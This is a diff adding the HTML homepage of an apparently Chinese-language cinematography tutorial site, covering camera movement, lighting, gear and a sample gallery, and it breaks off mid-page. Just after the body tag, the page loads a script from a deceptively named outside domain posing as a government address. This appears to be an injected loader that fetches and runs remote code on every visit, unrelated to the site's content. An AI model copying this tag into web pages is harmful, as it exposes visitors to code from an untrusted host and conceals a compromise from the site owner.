@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="renderer" content="webkit">
+<title>影视摄影 - 影视级摄影技巧与器材实战分享</title>
+<meta name="keywords" content="影视摄影,电影感拍摄,摄影器材推荐,运镜技巧,灯光布光,镜头语言,后期调色,短片创作">
+<meta name="description" content="影视摄影(yingshisheying-wap.github.io)专注影视级摄影技巧与实战教学，涵盖运镜、灯光、器材、调色与短片创作，帮助摄影爱好者拍出电影感的画面。">
+<meta name="author" content="影视摄影">
+<meta name="robots" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#05070d">
+<link rel="canonical" href="https://yingshisheying-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "影视摄影",
+  "url": "https://yingshisheying-wap.github.io/",
+  "description": "专注影视级摄影技巧、运镜、灯光、器材与短片创作实战教学",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://yingshisheying-wap.github.io/#search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "影视摄影",
+  "url": "https://yingshisheying-wap.github.io/",
+  "logo": "https://yingshisheying-wap.github.io/favicon.ico"
+}
+</script>
+<style>
+/* ============ 基础 ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#05070d; --bg2:#0a0e18; --ink:#0d1119; --line:rgba(255,255,255,.07);
+  --amber:#e8a33d; --amber2:#ffc66b; --teal:#2dd4bf; --rose:#f43f5e;
+  --txt:#e8edf5; --mute:#8b97a8; --dim:#5c6779;
+  --r:18px; --sh:0 20px 60px rgba(0,0,0,.55);
+  --h:72px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;overflow-x:hidden;-webkit-font-smoothing:antialiased
+}
+a{color:inherit;text-decoration:none;transition:color .25s,transform .25s}
+img{max-width:100%;height:auto;display:block}
+ul,ol{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+input{font-family:inherit;outline:none;border:none}
+h1,h2,h3,h4{line-height:1.32;font-weight:700}
+::selection{background:var(--amber);color:#1a1208}
+.container{max-width:1200px;margin:0 auto;padding:0 22px}
+section{padding:84px 0;position:relative}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:42px;flex-wrap:wrap}
+.head-l{display:flex;align-items:center;gap:13px}
+.head-l .bar{width:5px;height:26px;border-radius:3px;background:var(--amber);box-shadow:0 0 14px rgba(232,163,61,.6)}
+.head-l h2{font-size:1.85rem}
+.head-l h2 em{font-style:normal;color:var(--amber)}
+.head-s{font-size:.86rem;color:var(--dim);font-family:"SF Mono",Menlo,monospace}
+.more{color:var(--amber);font-size:.9rem;display:inline-flex;align-items:center;gap:5px;white-space:nowrap}
+.more:hover{color:#fff;transform:translateX(3px)}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 32px;border-radius:6px;font-size:.95rem;font-weight:700;color:#150f06;
+  background:linear-gradient(135deg,var(--amber),var(--amber2));box-shadow:0 8px 24px rgba(232,163,61,.3);transition:.3s}
+.btn:hover{transform:translateY(-3px);box-shadow:0 12px 34px rgba(232,163,61,.45);color:#150f06}
+.btn-ghost{background:transparent;color:var(--txt);border:1.5px solid var(--line);box-shadow:none}
+.btn-ghost:hover{border-color:var(--amber);color:var(--amber);background:rgba(232,163,61,.06)}
+
+/* ============ 顶部 ============ */
+.topbar{background:#0a0d14;font-size:.78rem;color:var(--mute);text-align:center;padding:8px 16px;border-bottom:1px solid var(--line)}
+.topbar b{color:var(--amber)}
+.navbar{position:sticky;top:0;z-index:1000;background:rgba(5,7,13,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);transition:.35s}
+.navbar.solid{box-shadow:0 10px 34px rgba(0,0,0,.6)}
+.wrap{display:flex;align-items:center;justify-content:space-between;height:var(--h)}
+.brand{display:flex;align-items:center;gap:12px;font-size:1.35rem;font-weight:900;letter-spacing:1px}
+.brand i{width:38px;height:38px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;background:var(--ink);border:1.5px solid var(--amber);font-style:normal}
+.brand em{font-style:normal;color:var(--amber)}
+.menu{display:flex;gap:2px;align-items:center}
+.menu a{padding:9px 16px;font-size:.9rem;font-weight:500;color:var(--mute);position:relative;transition:.25s;white-space:nowrap}
+.menu a:hover,.menu a.on{color:var(--amber)}
+.menu a.on::after{content:'';position:absolute;left:16px;right:16px;bottom:-3px;height:2px;background:var(--amber);border-radius:2px}
+.act{display:flex;gap:9px;align-items:center}
+.ico-btn{width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;background:var(--ink);border:1px solid var(--line);transition:.25s}
+.ico-btn:hover{background:var(--amber);color:#150f06;border-color:var(--amber)}
+.burger{display:none}
+.stamp{font-size:.72rem;color:var(--dim);font-family:monospace;border:1px solid var(--line);padding:4px 9px;border-radius:5px;white-space:nowrap}
+
+/* ============ Hero ============ */
+.hero{position:relative;min-height:92vh;display:flex;align-items:center;overflow:hidden;padding:64px 0;border-bottom:1px solid var(--line)}
+.hero::before{content:'';position:absolute;inset:0;z-index:0;
+  background:radial-gradient(ellipse at 80% 20%,rgba(232,163,61,.14),transparent 55%),radial-gradient(ellipse at 10% 85%,rgba(45,212,191,.08),transparent 50%)}
+.hero::after{content:'';position:absolute;inset:0;z-index:0;opacity:.35;
+  background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);background-size:58px 58px;mask-image:radial-gradient(ellipse at 30% 50%,black,transparent 78%)}
+.hero .container{position:relative;z-index:2;width:100%}
+.h-in{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:10px;font-family:monospace;font-size:.82rem;color:var(--amber);margin-bottom:22px}
+.kicker::before{content:'';width:34px;height:1px;background:var(--amber)}
+.hero h1{font-size:clamp(2.1rem,5.6vw,4rem);font-weight:900;line-height:1.12;letter-spacing:1px;margin-bottom:10px}
+.hero h1 .hl{color:var(--amber)}
+.hero .sub{font-size:1.15rem;color:#c3cbd8;margin-bottom:20px;font-weight:600}
+.hero p.desc{font-size:1rem;color:var(--mute);max-width:520px;margin-bottom:34px}
+.h-acts{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:40px}
+.h-meta{display:flex;gap:0;border-top:1px solid var(--line);padding-top:26px}
+.h-meta div{padding-right:40px;border-right:1px solid var(--line)}
+.h-meta div:last-child{border:0;padding-left:40px}
+.h-meta b{display:block;font-size:1.9rem;font-weight:900;color:var(--amber)}
+.h-meta small{font-size:.8rem;color:var(--dim)}
+
+/* Hero 右侧：曝光三角图（栏目1） */
+.tri{position:relative;background:var(--ink);border:1px solid var(--line);border-radius:var(--r);padding:26px;box-shadow:var(--sh)}
+.tri-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px}
+.tri-head h3{font-size:1.1rem}
+.tri-head span{font-family:monospace;font-size:.78rem;color:var(--dim);border:1px solid var(--line);padding:3px 9px;border-radius:4px}
+.tri-box{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:20px}
+.tri-cell{padding:16px 14px;border:1px solid var(--line);border-radius:11px;background:rgba(255,255,255,.02);transition:.3s}
+.tri-cell:hover{border-color:var(--amber);transform:translateY(-4px);background:rgba(232,163,61,.06)}
+.tri-cell i{font-style:normal;font-size:1.6rem;display:block;margin-bottom:8px}
+.tri-cell h4{font-size:.95rem;margin-bottom:4px}
+.tri-cell p{font-size:.78rem;color:var(--dim)}
+.tri-eq{display:flex;align-items:center;justify-content:center;gap:14px;font-family:monospace;font-size:.85rem;color:var(--mute);padding:14px;border-radius:9px;background:rgba(45,212,191,.06);border:1px dashed rgba(45,212,191,.3)}
+.tri-eq b{color:var(--teal);font-weight:700}
+
+/* ============ 栏目2 教程：横向卡片堆叠 ============ */
+.stack{display:flex;flex-direction:column;gap:16px}
+.card-h{display:grid;grid-template-columns:88px 1fr auto;gap:22px;align-items:center;padding:20px;background:var(--ink);border:1px solid var(--line);border-radius:14px;transition:.3s;position:relative;overflow:hidden}
+.card-h::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--amber);transform:scaleY(0);transition:.3s}
+.card-h:hover{border-color:rgba(232,163,61,.35);transform:translateX(6px)}
+.card-h:hover::before{transform:scaleY(1)}
+.card-h .num{font-size:2.6rem;font-weight:900;color:var(--line);font-style:italic;font-family:Georgia,serif;transition:.3s}
+.card-h:hover .num{color:var(--amber)}
+.card-h img{width:88px;height:62px;border-radius:9px;object-fit:cover;flex-shrink:0}
+.card-h h3{font-size:1.12rem;margin-bottom:6px}
+.card-h p{font-size:.85rem;color:var(--mute);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.card-h .tags{display:flex;gap:7px;flex-wrap:wrap;justify-content:flex-end}
+.card-h .tags b{padding:5px 11px;border-radius:5px;font-size:.74rem;font-weight:600;background:rgba(255,255,255,.05);color:var(--mute)}
+.card-h .tags b.hot{background:rgba(244,63,94,.14);color:#ff97a9}
+
+/* ============ 栏目3 器材：Bento 方块 ============ */
+.bento{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:150px;gap:14px}
+.bx{position:relative;border-radius:16px;overflow:hidden;background:var(--ink);border:1px solid var(--line);padding:20px;display:flex;flex-direction:column;justify-content:flex-end;transition:.35s}
+.bx:hover{transform:translateY(-5px);box-shadow:var(--sh);border-color:rgba(232,163,61,.3)}
+.bx img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:.55;transition:.6s}
+.bx:hover img{opacity:.75;transform:scale(1.08)}
+.bx::after{content:'';position:absolute;inset:0;background:linear-gradient(15deg,rgba(5,7,13,.96),rgba(5,7,13,.2) 70%)}
+.bx>*{position:relative;z-index:2}
+.bx.wide{grid-column:span 2}
+.bx.tall{grid-row:span 2}
+.bx h3{font-size:1.15rem;margin-bottom:4px}
+.bx p{font-size:.8rem;color:var(--mute)}
+.bx .price{position:absolute;top:16px;right:16px;z-index:2;font-family:monospace;font-size:.82rem;color:var(--amber);background:rgba(5,7,13,.7);padding:3px 9px;border-radius:5px}
+
+/* ============ 栏目4 画廊：交错瀑布 ============ */
+.mason{column-count:3;column-gap:18px}
+.gal{break-inside:avoid;margin-bottom:18px;border-radius:14px;overflow:hidden;position:relative;background:var(--ink);border:1px solid var(--line);transition:.35s}
+.gal:hover{transform:translateY(-5px);box-shadow:var(--sh);border-color:rgba(232,163,61,.3)}
+.gal img{width:100%;transition:.6s}
+.gal:hover img{transform:scale(1.07)}
+.gal .cap{position:absolute;left:0;right:0;bottom:0;padding:26px 18px 16px;background:linear-gradient(0deg,rgba(5,7,13,.95),transparent);transform:translateY(8px);opacity:.92;transition:.35s}
+.gal:hover .cap{transform:translateY(0);opacity:1}
+.gal .cap h4{font-size:.98rem}
+.gal .cap span{font-size:.76rem;color:var(--amber)}
+.gal .lbl{position:absolute;top:12px;left:12px;font-size:.72rem;font-family:monospace;color:#fff;background:rgba(5,7,13,.75);padding:4px 9px;border-radius:5px;backdrop-filter:blur(4px)}
+
+/* ============ 栏目5 数据：环形进度 ============ */
+.rings{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.ring{text-align:center;padding:26px 18px;background:var(--ink);border:1px solid var(--line);border-radius:16px;transition:.3s}
+.ring:hover{border-color:rgba(45,212,191,.4);transform:translateY(-5px)}
+.ring .svg{position:relative;width:120px;height:120px;margin:0 auto 16px}
+.ring svg{transform:rotate(-90deg)}
+.ring circle{fill:none;stroke-width:9;cx:60;cy:60;r:48}
+.ring .bg{stroke:rgba(255,255,255,.07)}
+.ring .fg{stroke:var(--teal);stroke-linecap:round;stroke-dasharray:301;transition:stroke-dashoffset 1.2s}
+.ring:nth-child(2) .fg{stroke:var(--amber)}
+.ring:nth-child(3) .fg{stroke:var(--rose)}
+.ring:nth-child(4) .fg{stroke:#a78bfa}
+.ring .pct{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:1.4rem;font-weight:900;font-family:Georgia,serif}
+.ring:nth-child(1) .pct{color:var(--teal)}
+.ring:nth-child(2) .pct{color:var(--amber)}
+.ring:nth-child(3) .pct{color:var(--rose)}
+.ring:nth-child(4) .pct{color:#a78bfa}
+.ring h4{font-size:1rem;margin-bottom:5px}
+.ring p{font-size:.8rem;color:var(--dim)}
+
+/* ============ 栏目6 问答：手风琴 ============ */
+.faq{border-top:1px solid var(--line)}
+.faq-i{border-bottom:1px solid var(--line)}
+.faq-q{width:100%;text-align:left;padding:22px 0;display:flex;justify-content:space-between;align-items:center;gap:18px;font-size:1.05rem;font-weight:600}
+.faq-q .ic{width:34px;height:34px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:var(--ink);border:1px solid var(--line);font-size:1.2rem;color:var(--amber);transition:.3s}
+.faq-i.open .ic{background:var(--amber);color:#150f06;transform:rotate(45deg)}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .45s ease}
+.faq-a div{padding:0 52px 24px 0;color:var(--mute);font-size:.93rem}
+
+/* ============ 作者栏 ============ */
+.author-band{background:linear-gradient(120deg,#0d1119,#080b12);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.a-grid{display:grid;grid-template-columns:200px 1fr 260px;gap:40px;align-items:center}
+.a-ava{width:160px;height:160px;border-radius:50%;object-fit:cover;border:3px solid var(--amber);padding:5px}
+.a-info h3{font-size:1.5rem;margin-bottom:6px}
+.a-info h3 span{color:var(--amber);font-weight:400;font-size:1rem;margin-left:10px}
+.a-info p{color:var(--mute)}
+.a-stats{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.a-stats div{text-align:center;padding:14px;background:var(--ink);border:1px solid var(--line);border-radius:12px}
+.a-stats b{display:block;font-size:1.5rem;font-weight:900;color:var(--amber)}
+.a-stats small{font-size:.78rem;color:var(--dim)}
+
+/* ============ 搜索 ============ */
+.smask{position:fixed;inset:0;z-index:2000;background:rgba(3,4,8,.97);backdrop-filter:blur(10px);display:none;align-items:flex-start;justify-content:center;padding-top:14vh}
+.smask.show{display:flex;animation:fade .25s}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+.sbox{width:100%;max-width:620px;padding:0 22px}
+.sbox input{width:100%;padding:20px 22px;border-radius:8px;font-size:1.2rem;background:var(--ink);color:#fff;border:2px solid var(--line)}
+.sbox input:focus{border-color:var(--amber)}
+.shots{margin-top:22px;display:flex;gap:9px;flex-wrap:wrap;align-items:center}
+.shots span{color:var(--dim);font-size:.85rem;font-family:monospace}
+.shots a{padding:8px 15px;border-radius:6px;font-size:.85rem;background:var(--ink);color:var(--mute);border:1px solid var(--line)}
+.shots a:hover{background:var(--amber);color:#150f06;border-color:var(--amber)}
+.sclose{position:absolute;top:26px;right:26px;width:46px;height:46px;border-radius:8px;background:var(--ink);border:1px solid var(--line);color:#fff;display:flex;align-items:center;justify-content:center}
+
+/* ============ 页脚 ============ */
+footer{background:#03040a;padding:64px 0 26px}
+.f-grid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.f-brand p{font-size:.87rem;color:var(--dim);margin-top:14px;max-width:330px}
+.f-col h4{font-size:1rem;margin-bottom:18px;color:#fff}
+.f-col ul{display:flex;flex-direction:column;gap:10px}
+.f-col a{font-size:.87rem;color:var(--dim)}
+.f-col a:hover{color:var(--amber);padding-left:5px}
+.f-bot{padding-top:24px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.f-bot p{font-size:.82rem;color:var(--dim)}
+
+.top{position:fixed;right:22px;bottom:26px;z-index:900;width:46px;height:46px;border-radius:8px;background:var(--amber);color:#150f06;display:none;align-items:center;justify-content:center;box-shadow:0 8px 22px rgba(232,163,61,.35)}
+.top.show{display:flex}
+.top:hover{transform:translateY(-4px)}
+
+/* ============ 响应式 ============ */
+@media(max-width:1024px){
+  .bento{grid-template-columns:repeat(3,1fr)}
+  .mason{column-count:2}
+  .rings{grid-template-columns:repeat(2,1fr);gap:22px}
+  .a-grid{grid-template-columns:150px 1fr;gap:30px}
+  .a-stats{grid-column:span 2}
+}
+@media(max-width:768px){
+  section{padding:58px 0}
+  .burger{display:flex}
+  .menu{position:fixed;top:var(--h);left:0;right:0;flex-direction:column;align-items:stretch;gap:0;background:rgba(5,7,13,.98);border-bottom:1px solid var(--line);max-height:0;overflow:hidden;transition:.4s}
+  .menu.open{max-height:520px}
+  .menu a{padding:15px 22px;border-radius:0;border-bottom:1px solid var(--line)}
+  .menu a.on::after{display:none}
+  .act .ico-btn:not(:last-child),.stamp{display:none}
+  .h-in{grid-template-columns:1fr;gap:40px}
+  .hero{min-height:auto;padding:40px 0}
+  .h-meta div{padding-right:20px}
+  .h-meta div:last-child{padding-left:20px}
+  .head-l h2{font-size:1.45rem}
+  .tri-box{grid-template-columns:1fr}
+  .card-h{grid-template-columns:1fr;gap:14px;text-align:center}
+  .card-h .num{font-size:1.8rem}
+  .card-h img{width:100%;height:auto;aspect-ratio:16/9;margin:0 auto}
+  .card-h .tags{justify-content:center}
+  .bento{grid-template-columns:repeat(2,1fr);grid-auto-rows:130px}
+  .bx.wide,.bx.tall{grid-column:span 1;grid-row:span 1}
+  .mason{column-count:1}
+  .f-grid{grid-template-columns:1fr 1fr;gap:28px}
+  .a-grid{grid-template-columns:1fr;text-align:center}
+  .a-ava{margin:0 auto}
+  .a-stats{grid-column:span 1}
+  .f-bot{flex-direction:column;text-align:center}
+}
+@media(max-width:460px){
+  .container{padding:0 15px}
+  .hero h1{font-size:2rem}
+  .tri{padding:18px}
+  .h-meta{flex-wrap:wrap;gap:16px}
+  .h-meta div{border:0;padding:0!important}
+  .f-grid{grid-template-columns:1fr}
+  .rings{grid-template-columns:1fr 1fr}
+  .top{right:14px;bottom:18px}
+}
+@media print{.navbar,footer,.top,.smask{display:none!important}body{background:#fff;color:#000}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="topbar">🎬 影视摄影 · 影视级摄影技巧与器材实战分享 · 运镜 · 灯光 · 调色 · 短片创作 · 每日更新</div>
+
+<header class="navbar" id="navbar">
+  <div class="container wrap">
+    <a href="#top" class="brand" aria-label="影视摄影首页"><i>🎞</i>影视<em>摄影</em></a>
+    <nav class="menu" id="menu" aria-label="主导航">
+      <a href="#tri" class="on">曝光三角</a>
+      <a href="#course">实战教程</a>
+      <a href="#gear">器材库</a>
+      <a href="#gallery">样片画廊</a>
+      <a href="#data">数据解析</a>
+      <a href="#qa">常见问题</a>
+    </nav>
+    <div class="act">
+      <span class="stamp">EST. 2026</span>
+      <button class="ico-btn" id="sOpen" aria-label="打开搜索">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><circle cx="11" cy="11" r="7"></circle><path d="M21 21l-4.3-4.3"></path></svg>
+      </button>
+      <button class="ico-btn" aria-label="订阅">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+      </button>
+      <button class="ico-btn burger" id="burger" aria-label="打开菜单">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"></path></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+<!-- Hero + 栏目1 曝光三角 -->
+<section class="hero" id="top">
+  <div class="container">
+    <div class="h-in">
+      <div>
+        <span class="kicker">FILMMAKING / CINEMATOGRAPHY</span>
+        <h1>把每一帧<br>都拍出<span class="hl">电影感</span></h1>
+        <p class="sub">影视摄影 · 影视级摄影技巧与实战教学</p>
+        <p class="desc">影视摄影专注分享影视级拍摄思维与实战技巧：运镜、灯光、器材选型、镜头语言与后期调色，帮助每一位摄影爱好者用普通设备拍出不普通的画面。</p>
+        <div class="h-acts">
+          <a href="#course" class="btn">开始学习
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M13 6l6 6-6 6"></path></svg>
+          </a>
+          <a href="#gallery" class="btn btn-ghost">看样片</a>
+        </div>
+        <div class="h-meta">
+          <div><b>200+</b><small>原创教程</small></div>
+          <div><b>50+</b><small>器材评测</small></div>
+          <div><b>12万</b><small>摄影爱好者</small></div>
+        </div>
+      </div>
+      <aside class="tri" aria-label="曝光三角">
+        <div class="tri-head"><h3>曝光三要素</h3><span>APERTURE · SHUTTER · ISO</span></div>
+        <div class="tri-box">
+          <div class="tri-cell"><i>🔘</i><h4>光圈</h4><p>控制进光量与景深虚实</p></div>
+          <div class="tri-cell"><i>⏱</i><h4>快门</h4><p>决定动态模糊与运动感</p></div>
+          <div class="tri-cell"><i>🌡</i><h4>ISO</h4><p>感光度的暗光救星</p></div>
+        </div>
+        <div class="tri-eq"><span>180° 快门法则</span><b>|</b><span>帧率 25fps → 快门 1/50s</span></div>
+        <div class="tri-eq" style="margin-top:12px"><span>黄金分割</span><b>|</b><span>f/2.8 · 1/50s · ISO 800</span></div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：实战教程 横向卡片堆叠 -->
+<section id="course" style="background:var(--bg2)">
+  <div class="container">
+    <div class="head">
+      <div class="head-l"><div class="bar"></div><h2>实战<em>教程</em></h2></div>
+      <span class="head-s">// TUTORIAL_06</span>
+      <a href="#" class="more">全部教程 ›</a>
+    </div>
+    <div class="stack">
+      <article class="card-h"><span class="num">01</span><img src="https://images.unsplash.com/photo-1502920917128-1aa500764cbd?w=400&q=80" alt="运镜教程" loading="lazy"><div><h3>手持运镜的 8 种经典走位</h3><p>从推拉摇移到环绕跟随，拆解电影里最常见的手持运镜手法与练习方法。</p><div class="tags"><b>运镜</b><b>入门</b><b class="hot">热门</b></div></div></article>
+      <article class="card-h"><span class="num">02</span><img src="https://images.unsplash.com/photo-1606983340126-99ab4feaa6a5?w=400&q=80" alt="布光教程" loading="lazy"><div><h3>三人对话场景的三点布光法</h3><p>主光、辅光、轮廓光的完整配置方案，低成本也能打出电影质感。</p><div class="tags"><b>灯光</b><b>布光</b></div></div></article>
+      <article class="card-h"><span class="num">03</span><img src="https://images.unsplash.com/photo-1518131672697-613becd4fab5?w=400&q=80" alt="构图教程" loading="lazy"><div><h3>用前景与纵深构建镜头层次</h3><p>告别平面感：前景遮挡、纵深引导线与空气透视的实战应用。</p><div class="tags"><b>构图</b><b>进阶</b><b class="hot">热门</b></div></div></article>
+      <article class="card-h"><span class="num">04</span><img src="https://images.unsplash.com/photo-1495707902641-75cac588d2e9?w=400&q=80" alt="夜景教程" loading="lazy"><div><h3>城市夜景拍摄：灯光与噪点的平衡</h3><p>低照度环境下的参数搭配与降噪思路，让夜戏干净通透。</p><div class="tags"><b>夜景</b><b>参数</b></div></div></article>
+      <article class="card-h"><span class="num">05</span><img src="https://images.unsplash.com/photo-1554046920-90dc8d4d36c4?w=400&q=80" alt="调色教程" loading="lazy"><div><h3>DaVinci 调色：从灰片到电影色调</h3><p>一级校色、二级选区与 LUT 工作流，快速建立统一视觉风格。</p><div class="tags"><b>后期</b><b>调色</b><b class="hot">热门</b></div></div></article>
+      <article class="card-h"><span class="num">06</span><img src="https://images.unsplash.com/photo-1574717024653-61fd2cf4d44d?w=400&q=80" alt="短片教程" loading="lazy"><div><h3>短片分镜：用画面讲故事</h3><p>从剧本到分镜表，学会用镜头顺序控制节奏与情绪。</p><div class="tags"><b>分镜</b><b>创作</b></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：器材库 Bento -->
+<section id="gear">
+  <div class="container">
+    <div class="head">
+      <div class="head-l"><div class="bar"></div><h2>器材<em>库</em></h2></div>
+      <span class="head-s">// GEAR_PICKS</span>
+      <a href="#" class="more">更多评测 ›</a>
+    </div>
+    <div class="bento">
+      <article class="bx wide"><img src="https://images.unsplash.com/photo-1606983340077-11fb414e1d60?w=600&q=80" alt="相机" loading="lazy"><span class="price">¥12,999</span><h3>全画幅电影机</h3><p>6K 内录 · 15+ 档动态范围</p></article>
+      <article class="bx tall"><img src="https://images.unsplash.com/photo-1610701596061-2ecf227e85b2?w=400&q=80" alt="镜头" loading="lazy"><span class="price">¥6,800</span><h3>35mm 定焦镜头</h3><p>大光圈电影感首选焦段</p></article>
+      <article class="bx"><img src="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=400&q=80" alt="稳定器" loading="lazy"><span class="price">¥2,299</span><h3>三轴稳定器</h3><p>丝滑运镜必备</p></article>
+      <article class="bx"><img src="https://images.unsplash.com/photo-1598899138076-9c50df1a42e1?w=400&q=80" alt="灯光" loading="lazy"><span class="price">¥1,580</span><h3>LED 影视灯</h3><p>双色温 · 高显色</p></article>
+      <article class="bx"><img src="https://images.unsplash.com/photo-1581094271901-8022df4466f9?w=400&q=80" alt="麦克风" loading="lazy"><span class="price">¥899</span><h3>枪式麦克风</h3><p>清晰收声好帮手</p></article>
+      <article class="bx wide"><img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600&q=80" alt="监视器" loading="lazy"><span class="price">¥3,200</span><h3>外录监视器</h3><p>4K HDR 监看 · 峰值对焦</p></article>
+    </div>
+  </div>
+</section>
+
+<!-- 作者栏 -->
+<section class="author-band">
+  <div class="container">
+    <div class="a-grid">
+      <img class="a-ava" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&q=80" alt="作者头像" loading="lazy">
+      <div class="a-info">
+        <h3>林一 / 影视摄影主理人<span>独立导演 · 摄影指导</span></h3>
+        <p>10 年影视拍摄经验，参与过 30+ 短片与广告项目。在这里分享真正能在片场用上的摄影干货。</p>
+      </div>
+      <div class="a-stats">
+        <div><b>30+</b><small>拍摄项目</small></div>
+        <div><b>200+</b><small>原创文章</small></div>
+        <div><b>12万</b><small>订阅读者</small></div>
+        <div><b>4.9</b><small>课程评分</small></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：样片画廊 瀑布流 -->
+<section id="gallery" style="background:var(--bg2)">
+  <div class="container">
+    <div class="head">
+      <div class="head-l"><div class="bar"></div><h2>样片<em>画廊</em></h2></div>
+      <span class="head-s">// STILLS & BTS</span>
+      <a href="#" class="more">查看全部 ›</a>
+    </div>
+    <div class="mason">
+      <figure class="gal"><span class="lbl">35mm · f/2.0</span><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>暮色街角</h4><span>城市夜景 · 暖调</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">85mm · f/1.4</span><img src="https://images.unsplash.com/photo-1495707902641-75cac588d2e9?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>逆光人像</h4><span>逆光 · 浅景深</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">24mm · f/4.0</span><img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>荒野公路</h4><span>风光 · 广角</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">50mm · f/1.8</span><img src="https://images.unsplash.com/photo-1502920917128-1aa500764cbd?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>窗边对话</h4><span>室内 · 自然光</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">70mm · f/2.8</span><img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>晨雾山林</h4><span>风光 · 空气透视</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">135mm · f/2.0</span><img src="https://images.unsplash.com/photo-1470225620780-dba8ba36b745?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>舞台追光</h4><span>现场 · 强对比</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">28mm · f/5.6</span><img src="https://images.unsplash.com/photo-1518131672697-613becd4fab5?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>老巷纵深</h4><span>构图 · 引导线</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">50mm · f/1.4</span><img src="https://images.unsplash.com/photo-1492321936769-b49830bc1d1e?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>咖啡时光</h4><span>静物 · 柔和光</span></figcaption></figure>
+      <figure class="gal"><span class="lbl">200mm · f/4.0</span><img src="https://images.unsplash.com/photo-1554046920-90dc8d4d36c4?w=500&q=80" alt="样片" loading="lazy"><figcaption class="cap"><h4>黄金时刻</h4><span>逆光 · 剪影</span></figcaption></figure>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：数据解析 环形图 -->
+<section id="data">
+  <div class="container">
+    <div class="head">
